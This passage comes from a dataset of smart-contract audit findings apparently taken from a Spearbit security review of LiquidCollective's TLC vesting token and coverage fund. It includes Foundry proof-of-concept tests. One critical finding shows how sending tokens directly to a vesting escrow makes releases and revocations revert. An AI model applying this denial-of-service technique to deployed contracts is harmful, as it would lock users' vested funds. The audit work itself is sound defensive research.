derflow error when called before the vesting schedule ends. The underflow error leasableAmount will enter uint256 releasedAmount = _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) - balanceOf(_escrow); is thrown because, when called before the schedule ends, _computeVestingRe- try to compute the if (_time < _vestingSchedule.end) branch and will In this case, _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) will always be lower than balanceOf(_escrow) and the contract will revert with an underflow error. When the vesting period ends, the contract will not enter the if (_time < _vestingSchedule.end) and the user will be able to gain the whole vested amount plus the extra amount of TLC sent to the escrow account by the malicious user. Scenario: 1) Bob owns 1 TLC token. 2) Alluvial creates a vesting schedule for Alice like the following example: createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); 3) Bob sends 1 TLC token to the vesting schedule escrow account of the Alice vesting schedule. 8 4) After the cliff period, Alice should be able to release 1 TLC token. Because now balanceOf(_escrow) is 11 it will underflow as _computeVestedAmount(_vestingSchedule, _vestingSchedule.end) returns 10. Find below a test case showing all three different DOS scenarios: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDOSReleaseVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice 9 vm.prank(bob); tlc.transfer(aliceEscrow, 1); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); // The transaction will revert for UNDERFLOW because now the balance of the escrow has been ,! increased externally vm.expectRevert(stdError.arithmeticError); tlc.releaseVestingSchedule(0); // Warp at the vesting schedule period end vm.warp(block.timestamp + 9 days); // Alice is able to get the whole vesting schedule amount // plus the token sent by the attacker to the escrow contract vm.prank(alice); tlc.releaseVestingSchedule(0); assertEq(tlc.balanceOf(alice), 11); } function testDOSRevokeVestingSchedule() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); // The creator decide to revoke the vesting schedule before the end timestamp // It will throw an underflow error vm.prank(initAccount); vm.expectRevert(stdError.arithmeticError); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 1)); } function testDOSComputeVestingReleasableAmount() public { // send Bob 1 vote token vm.prank(initAccount); tlc.transfer(bob, 1); // create a vesting schedule for Alice 10 vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); // Bob send one token directly to the Escrow contract of alice vm.prank(bob); tlc.transfer(aliceEscrow, 1); vm.expectRevert(stdError.arithmeticError); uint256 releasableAmount = tlc.computeVestingReleasableAmount(0); // Warp to the end of the vesting schedule vm.warp(block.timestamp + 10 days); releasableAmount = tlc.computeVestingReleasableAmount(0); assertEq(releasableAmount, 11); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } 11 }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Critical Risk"]}, {"title": "Coverage funds might be pulled not only for the purpose of covering slashing losses", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The newly introduced coverage fund is a smart contract that holds ETH to cover a potential lsETH price decrease due to unexpected slashing events. Funds might be pulled from CoverageFundV1 to the River contract through setConsensusLayerData to cover the losses and keep the share price stable In practice, however, it is possible that these funds will be pulled not only in emergency events. _maxIncrease is used as a measure to enforce the maximum difference between prevTotalEth and postTotalEth, but in practice, it is being used as a mandatory growth factor in the context of coverage funds, which might cause the pulling of funds from the coverage fund to ensure _maxIncrease of revenue in case fees are not high enough.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Medium Risk"]}, {"title": "Consider preventing CoverageFundAddress to be set as address(0)", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of River.setCoverageFund and CoverageFundAddress.set both func- tion do not revert when the _newCoverageFund address parameter is equal to address(0). If the Coverage Fund address is empty, the River._pullCoverageFunds function will return earlier and will not pull any coverage fund.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Medium Risk"]}, {"title": "CoverageFund.initCoverageFundV1 might be front-runnable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Upgradeable contracts are used in the project, mostly relying on a TUPProxy contract. Initializing a contract is a 2 phase process where the first call is the actual deployment and the second call is a call to the init function itself. From our experience with the repository, the upgradeable contracts deployment scripts are using the TUPProxy correctly, however in that case we were not able to find the deployment script for CoverFund, so we decided to raise this point to make sure you are following the previous policy also for this contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Low Risk"]}, {"title": "Account owner of the minted TLC tokens must call delegate to own vote power of initial minted tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "ken.delegate(accountOwner) to auto-delegate to itself, otherwise it will have zero voting power. the minted TLC tokens must The _account owner of remember to call tlcTo- Without doing that anyone (even with just 1 voting power) could make any proposal pass and in the future manage the DAO proposing, rejecting or accepting/executing proposals. As the OpenZeppelin ERC20 documentation says: By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Low Risk"]}, {"title": "Consider using unchecked block to save some gas", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Because of the if statement, it is impossible for vestedAmount - releasedAmount to underflow, thus allowing the usage of the unchecked block to save a bit of gas.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Gas Optimization"]}, {"title": "createVestingSchedule allows the creation of a vesting schedule that could release zero tokens after a period has passed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Depending on the value of duration or amount it is possible to create a vesting schedule that would release zero token after a whole period has elapsed. This is an edge case scenario but would still be possible given that createVestingSchedule can be called by anyone and not only Alluvial. See the following test case for an example //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearVestTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testDistributeZeroPerPeriod() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, duration: 365 days, period: 1 days, amount: 100, beneficiary: alice, delegatee: address(0), 15 revocable: true }) ); // One whole period pass and alice check how many tokens she can release vm.warp(block.timestamp + 1 days); uint256 releasable = tlc.computeVestingReleasableAmount(0); assertEq(releasable, 0); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "CoverageFund - Checks-Effects-Interactions best practice is violated", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "We were not able to find any concrete instances of harmful reentrancy attack vectors in this contract, but it's recommended to follow the Checks-effects-interactions pattern anyway.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "River contract allows setting an empty metadata URI", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of River.setMetadataURI and MetadataURI.set both allow the current value of the metadata URI to be updated to an empty string.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider requiring that the _cliffDuration is a multiple of _period", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "When a vesting schedule is created via _createVestingSchedule, the only check made on _period parameter (other than being greater than zero) is that the _duration must be a multiple of _period. If after the _cliffDuration the user can already release the matured vested tokens, it could make sense to also require that _cliffDuration % _period == 0", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Add documentation about the scenario where a vesting schedule can be created in the past", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of ERC20VestableVotesUpgradeable _createVestingSchedule func- tion, there is no check for the _start value. This means that the creator of a vesting schedule could create a schedule that starts in the past. Allowing the creation of a vesting schedule with a past _start also influences the behavior of _revokeVestingSchedule (see ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked).", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "ERC20VestableVotesUpgradeableV1 createVestingSchedule allows the creation of vesting schedules that have already ended and cannot be revoked", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The current implementation of _createVestingSchedule allows the creation of vesting schedules that  Start in the past: _start < block.timestamp.  Have already ended: _start + _duration < block.timestamp. Because of this behavior, in case of the creation of a past vesting schedule that has already ended  The _beneficiary can instantly call (if there's no lock period) releaseVestingSchedule to release the whole amount of tokens.  The creator of the vesting schedule cannot call revokeVestingSchedule because the new end would be in the past and the transaction would revert with an InvalidRevokedVestingScheduleEnd error. The second scenario is particularly important because it does not allow the creator to reduce the length or remove the schedule entirely in case the schedule has been created mistakenly or with a misconfiguration (too many token vested, lock period too long, etc...).", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "getVestingSchedule returns misleading information if the vesting token creator revokes the sched- ule", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The getVestingSchedule function returns the information about the created vesting schedule. The duration represents the number of seconds of the vesting period and the amount represents the number of tokens that have been scheduled to be released after the period end (or after lockDuration if it has been configured to be greater than end). If the creator of the vesting schedule calls revokeVestingSchedule, only the end of the vesting schedule struct will be updated. If external contracts or dApps rely only on the getVestingSchedule information there could be scenarios where they display or base their logic on wrong information. Consider the following example. Alluvial creates a vesting schedule for alice with the following config 18 { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true This means that after 10 days, Alice would own in her balance 10 TLC tokens. If Alluvial calls revokeVestingSchedule before the cliff period ends, all of the tokens will be returned to Alluvial but the getVestingSchedule function would still display the same information with just the end attribute updated. An external dApp or contract that does not check the new end and compares it to cliffDuration, lockDura- tion, and period but only uses the amount would display the wrong number of vested tokens for Alice at a given timestamp.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The computeVestingVestedAmount will return the wrong amount of vested tokens if the creator of the vested schedule revokes the schedule. This function returns the value returned by _computeVestedAmount that relies on duration and amount while the only attribute changed by revokeVestingSchedule is the end. 19 function _computeVestedAmount(VestingSchedules.VestingSchedule memory _vestingSchedule, uint256 _time) internal pure returns (uint256) { if (_time < _vestingSchedule.start + _vestingSchedule.cliffDuration) { // pre-cliff no tokens have been vested return 0; } else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) { // post vesting all tokens have been vested return _vestingSchedule.amount; } else { uint256 timeFromStart = _time - _vestingSchedule.start; // compute tokens vested for completly elapsed periods uint256 vestedDuration = timeFromStart - (timeFromStart % _vestingSchedule.period); return (vestedDuration * _vestingSchedule.amount) / _vestingSchedule.duration; } } If the creator revokes the schedule, the computeVestingVestedAmount would return more tokens compared to the amount that the user has vested in reality. Consider the following example. Alluvial creates a vesting schedule with the following config { } \"start\": block.timestamp, \"cliffDuration\": 1 days, \"lockDuration\": 0, \"duration\": 10 days, \"period\": 1 days, \"amount\": 10, \"beneficiary\": alice, \"delegatee\": alice, \"revocable\": true Alluvial then calls revokeVestingSchedule(0, uint64(block.timestamp + 5 days));. The effect of this trans- action would return 5 tokens to Alluvial and set the new end to block.timestamp + 5 days. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + 7 days), it would return 7 because _computeVestedAmount would execute the code in the else branch. But alice cannot have more than 5 vested tokens because of the previous revoke. If alice calls computeVestingVestedAmount(0) at the time uint64(block.timestamp + duration)it would return 10 because _computeVestedAmount would execute the code in the else if (_time >= _vestingSchedule.start + _vestingSchedule.duration) branch. But alice cannot have more than 5 vested tokens because of the previous revoke. Attached test below to reproduce it: //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { 20 function __computeVestingReleasableAmount(uint256 vestingID, uint256 _time) external view returns (uint256) { ,! return _computeVestingReleasableAmount( VestingSchedules.get(vestingID), _deterministicVestingEscrow(vestingID), _time ); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal creator; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); creator = makeAddr(\"creator\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testIncorrectComputeVestingVestedAmount() public { vm.prank(initAccount); tlc.transfer(creator, 10); // create a vesting schedule for Alice vm.prank(creator); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 0 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: true }) ); // creator call revokeVestingSchedule revoking the vested schedule setting the new end as half ,! of the duration // 5 tokens are returned to the creator and `end` is updated to the new value // this means also that at max alice will have 5 token vested (and releasable) vm.prank(creator); tlc.revokeVestingSchedule(0, uint64(block.timestamp + 5 days)); // We warp at day 7 of the schedule vm.warp(block.timestamp + 7 days); 21 // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 7); // We warp at day 10 (we reached the total duration of the vesting) vm.warp(block.timestamp + 3 days); // This should fail because alice at max have only 5 token vested because of the revoke assertEq(tlc.computeVestingVestedAmount(0), 10); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider writing clear documentation on how the voting power and delegation works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "ERC20VotesUpgradeable contract. As the official OpenZeppelin documentation says (also reported in the Alluvial's natspec contract): ERC20VestableVotesUpgradeableV1 extension The an of is By default, token balance does not account for voting power. This makes transfers cheaper. The downside is that it requires users to delegate to themselves in order to activate checkpoints and have their voting power tracked. Because of how ERC20VotesUpgradeable behaves on voting power and delegation of voting power could be coun- terintuitive for normal users who are not aware of it, Alluvial should be very explicit on how users should act when a vesting schedule is created for them. When a Vote Token is transferred, ERC20VotesUpgradeable calls the hook _afterTokenTransfer function _afterTokenTransfer( address from, address to, uint256 amount ) internal virtual override { super._afterTokenTransfer(from, to, amount); _moveVotingPower(delegates(from), delegates(to), amount); } In this case, _moveVotingPower(delegates(from), delegates(to), amount); will decrease the voting power of delegates(from) by amount and will increase the voting power of delegates(to) by amount. This applies if some conditions are true, but you can see them here function _moveVotingPower( address src, address dst, uint256 amount ) private { if (src != dst && amount > 0) { if (src != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[src], _subtract, ,! amount); emit DelegateVotesChanged(src, oldWeight, newWeight); } if (dst != address(0)) { (uint256 oldWeight, uint256 newWeight) = _writeCheckpoint(_checkpoints[dst], _add, amount); emit DelegateVotesChanged(dst, oldWeight, newWeight); } } } When a vesting schedule is created, the creator has two options: 1) Specify a custom delegatee different from the beneficiary (or equal to it, but it's the same as option 2). 2) Leave the delegatee empty (equal to address(0)).  Scenario 1) empty delegatee OR delegatee === beneficiary (same thing) After creating the vesting schedule, the voting power of the beneficiary will be equal to the amount of tokens vested. If the beneficiary did not call tlc.delegate(beneficiary) previously, after releasing some tokens, its voting power will be decreased by the amount of released tokens. 23  Scenario 2) delegatee !== beneficiary && delegatee !== address(0) Same thing as before, but now we have two different actors, one is the beneficiary and another one is the delegatee of the voting power of the vested tokens. If the beneficiary did not call tlc.delegate(vestingScheduleDelegatee) previously, after releasing some to- kens, the voting power of the current vested schedule's delegatee will be decreased by the amount of released tokens.  Related test for scenario 1 //SPDX-License-Identifier: MIT pragma solidity 0.8.10; import \"forge-std/Test.sol\"; import \"../src/TLC.1.sol\"; contract WrappedTLC is TLCV1 { function deterministicVestingEscrow(uint256 _index) external view returns (address escrow) { return _deterministicVestingEscrow(_index); } } contract SpearTLCTest is Test { WrappedTLC internal tlc; address internal escrowImplem; address internal initAccount; address internal bob; address internal alice; address internal carl; function setUp() public { initAccount = makeAddr(\"init\"); bob = makeAddr(\"bob\"); alice = makeAddr(\"alice\"); carl = makeAddr(\"carl\"); tlc = new WrappedTLC(); tlc.initTLCV1(initAccount); } function testLosingPowerAfterRelease() public { // create a vesting schedule for Alice vm.prank(initAccount); createVestingSchedule( VestingSchedule({ start: block.timestamp, cliffDuration: 1 days, lockDuration: 0, // no lock duration: 10 days, period: 1 days, amount: 10, beneficiary: alice, delegatee: address(0), revocable: false }) ); address aliceEscrow = tlc.deterministicVestingEscrow(0); assertEq(tlc.getVotes(alice), 10); 24 assertEq(tlc.balanceOf(alice), 0); // Cliff period has passed and Alice try to get the first batch of the vested token vm.warp(block.timestamp + 1 days); vm.prank(alice); tlc.releaseVestingSchedule(0); // Alice now owns the vested tokens just released but her voting power has decreased by the ,! amount released assertEq(tlc.getVotes(alice), 9); assertEq(tlc.balanceOf(alice), 1); } struct VestingSchedule { uint256 start; uint256 cliffDuration; uint256 lockDuration; uint256 duration; uint256 period; uint256 amount; address beneficiary; address delegatee; bool revocable; } function createVestingSchedule(VestingSchedule memory config) internal returns (uint256) { return createVestingScheduleStackOptimized(config); } function createVestingScheduleStackOptimized(VestingSchedule memory config) internal returns (uint256) { ,! return tlc.createVestingSchedule( uint64(config.start), uint32(config.cliffDuration), uint32(config.duration), uint32(config.period), uint32(config.lockDuration), config.revocable, config.amount, config.beneficiary, config.delegatee ); } }", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Fix mismatch between revert error message and code behavior", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The error message requires the schedule duration to be greater than the cliff duration, but the code allows it to be greater than or equal to the cliff duration.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Improve documentation and naming of period variable", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Similar to Consider renaming period to periodDuration to be more descriptive, the variable name and documentation are ambiguous. We can give a more descriptive name to the variable and fix the documenta- tion.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming period to periodDuration to be more descriptive", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "period can be confused as (for example) a counter or an id.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider removing coverageFunds variable and explicitly initialize executionLayerFees to zero", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Inside the OracleManager.setConsensusLayerData the coverageFunds variable is declared but never used. Consider cleaning the code by removing the unused variable. The executionLayerFees variable instead should be explicitly initialized to zero to not rely on compiler assump- tions.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming IVestingScheduleManagerV1 interface to IERC20VestableVotesUpgradeableV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The IVestingScheduleManager interface contains all ERC20VestableVotesUpgradeableV1 needs to implement and use. the events, errors, and functions that Because there's no corresponding VestingScheduleManager contract implementation, it would make sense to rename the interface to IERC20VestableVotesUpgradeableV1.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider renaming CoverageFundAddress COVERAGE_FUND_ADDRESS to be consistent with the current naming convention", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Consider renaming the constant used to access the unstructured storage slot COVERAGE_FUND_- ADDRESS. To follow the naming convention already adopted across all the contracts, the variable should be renamed to COVERAGE_FUND_ADDRESS_SLOT.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider reverting if the msg.value is zero in CoverageFundV1.donate", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "In the current implementation of CoverageFundV1.donate there is no check on the msg.value value. Because of this, the sender can \"spam\" the function and emit multiple useless Donate events.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider having a separate function in River contract that allows CoverageFundV1 to send funds instead of using the same function used by ELFeeRecipientV1", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "When the River contract calls the CoverageFundV1 contract to pull funds, the CoverageFundV1 sends funds to River by calling IRiverV1(payable(river)).sendELFees{value: amount}();. sendELFees is a function that is currently used by both CoverageFundV1 and ELFeeRecipientV1. function sendELFees() external payable { if (msg.sender != ELFeeRecipientAddress.get() && msg.sender != CoverageFundAddress.get()) { revert LibErrors.Unauthorized(msg.sender); } } It would be cleaner to have a separate function callable only by the CoverageFundV1 contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Extensively document how the Coverage Funds contract works", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "The Coverage Fund contract has a crucial role inside the Protocol, and the current contract's docu- mentation does not properly cover all the needed aspects. Consider documenting the following aspects:  General explanation of the Coverage Funds and it's purpose.  Will donations happen only after a slash/penalty event? Or is there a \"budget\" that will be dumped on the contract regardless of any slashing events?  If a donation of XXX ETH is made, how is it handled? In a single transaction or distributed over a period of time?  Explain carefully that when ETH is donated, no shares are minted.  Explain all the possible market repercussions of the integration of Coverage Funds.  Is there any off-chain validation process before donating? 29  Who are the entities that are enabled to donate to the fund?  How is the Coverage Funds integrated inside the current Alluvial protocol?  Any additional information useful for the users, investors, and other actors that interact with the protocol.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Missing/wrong natspec comment and typos", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": " Natspec  Missing part of the natspec comment for /// @notice Attempt to revoke at a relative to InvalidRevokedVestingScheduleEnd in IVestingScheduleManager  Natspec missing the @return part for getVestingSchedule in IVestingScheduleManager.  Wrong order of natspec @param for createVestingSchedule in IVestingScheduleManager. The @param _beneficiary should be placed before @param _delegatee to follow the function signature order.  Natspec missing the @return part for delegateVestingEscrow in IVestingScheduleManager.  Wrong natspec comment, operators should be replaced with vesting schedules for @custom:attribute of struct SlotVestingSchedule in VestingSchedules. 30  Wrong natspec parameter, replace operator with vesting schedule in the VestingSchedules.push func- tion.  Missing @return natspec for _delegateVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _deterministicVestingEscrow in ERC20VestableVotesUpgradeable.  Missing @return natspec for _getCurrentTime in ERC20VestableVotesUpgradeable.  Add the Coverage Funds as a source of \"extra funds\" in the Oracle._pushToRiver natspec documentation in Oracle.  Update the InvalidCall natspec in ICoverageFundV1 given that the error is thrown also in the receive() external payable function of CoverageFundV1.  Update the natspec of struct VestingSchedule lockDuration attribute in VestingSchedules by explaining that the lock duration of a vesting schedule could possibly exceed the overall duration of the vesting.  Update the natspec of lockDuration in ERC20VestableVotesUpgradeable by explaining that the lock dura- tion of a vesting schedule could possibly exceed the overall duration of the vesting.  Consider making the natspec documentation of struct VestingSchedule in VestingSchedules and the natspec in ERC20VestableVotesUpgradeable be in sync.  Add more examples (variations) to the natspec documentation of the vesting schedules example in ERC20VestableVotesUpgradeable to explain all the possible combination of scenarios.  Make the ERC20VestableVotesUpgradeable natspec documentation about the vesting schedule consis- tent with the natspec documentation of _createVestingSchedule and VestingSchedules struct Vest- ingSchedule.  Typos  Replace all Overriden instances with Overridden in River.  Replace transfer with transfers in ERC20VestableVotesUpgradeable.1.sol#L147.  Replace token with tokens in ERC20VestableVotesUpgradeable.1.sol#L156.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Different behavior between River _pullELFees and _pullCoverageFunds", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Both _pullELFees and _pullCoverageFunds implement the same functionality:  Pull funds from a contract address.  Update the balance storage variable.  Emit an event.  Return the amount of balance collected from the contract. The _pullCoverageFunds differs from the _pullELFees implementation by avoiding both updating the Balance- ToDeposit when collectedCoverageFunds == 0 and emitting the PulledCoverageFunds event. Because they are implementing the same functionality, they should follow the same behavior if there is not an explicit reason to not do so. 31", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Move local mask variable from Allowlist.1.sol to LibAllowlistMasks.sol", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "LibAllowlistMasks.sol is meant to contain all mask values, but DENY_MASK is a local variable in the Allowlist.1.sol contract.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Consider adding additional parameters to the existing events to improve filtering/monitoring", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/LiquidCollective2-Spearbit-Security-Review.pdf", "body": "Some already defined events could be improved by adding more parameters to better track those events in dApps or monitoring tools.  Consider adding address indexed delegatee as an event's parameter to event CreatedVestingSchedule. While it's true that after the vest/lock period the beneficiary will be the owner of those tokens, in the meanwhile (if _delegatee != address(0)) the voting power of all those vested tokens are delegated to the _delegatee.  Consider adding address indexed beneficiary to event ReleasedVestingSchedule.  Consider adding uint256 newEnd to event RevokedVestingSchedule to track the updated end of the vesting schedule.  Consider adding address indexed beneficiary to event DelegatedVestingEscrow. If those events parameters are added to the events, the Alluvial team should also remember to update the relative natspec documentation.", "labels": ["Spearbit", "LiquidCollective2", "Severity: Informational"]}, {"title": "Missing indexed keyword in events parameters", "html_url": 